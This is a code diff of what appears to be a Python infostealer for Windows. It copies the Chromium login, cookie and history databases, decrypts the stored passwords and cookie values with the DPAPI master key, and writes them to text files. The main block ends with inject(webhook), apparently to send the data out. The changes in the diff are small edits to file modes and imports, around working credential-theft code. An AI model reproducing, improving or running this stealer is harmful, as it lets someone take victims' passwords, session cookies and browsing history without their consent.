@@ -1,4 +1,4 @@
-import os, time
+import os
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 from json import loads
@@ -197,7 +197,7 @@ class browsers():
         copy2(path, "Loginvault.db")
         conn = connect("Loginvault.db")
         cursor = conn.cursor()
-        with open('.\\browser-passwords.txt', 'a') as f:
+        with open('.\\browser-passwords.txt', 'a+') as f:
             for res in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
                 url, username, password = res
                 password = self.decrypt_password(password, self.masterkey)
@@ -217,7 +217,7 @@ class browsers():
         copy2(path, "Cookievault.db")
         conn = connect("Cookievault.db")
         cursor = conn.cursor()
-        with open('.\\browser-cookies.txt', 'a', encoding="utf-8") as f:
+        with open('.\\browser-cookies.txt', 'a+', encoding="utf-8") as f:
             for res in cursor.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall():
                 host_key, name, path, encrypted_value, expires_utc = res
                 value = self.decrypt_password(encrypted_value, self.masterkey)
@@ -237,7 +237,7 @@ class browsers():
         copy2(path, "Historyvault.db")
         conn = connect("Historyvault.db")
         cursor = conn.cursor()
-        with open('.\\browser-history.txt', 'a', encoding="utf-8") as f:
+        with open('.\\browser-history.txt', 'a+', encoding="utf-8") as f:
             sites = []
             for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
                 url, title, visit_count, last_visit_time = res
@@ -323,4 +323,3 @@ if __name__ == '__main__':
         t = Thread(target=thread, daemon=True)
         t.start()
     inject(webhook)
-    time.sleep(5)
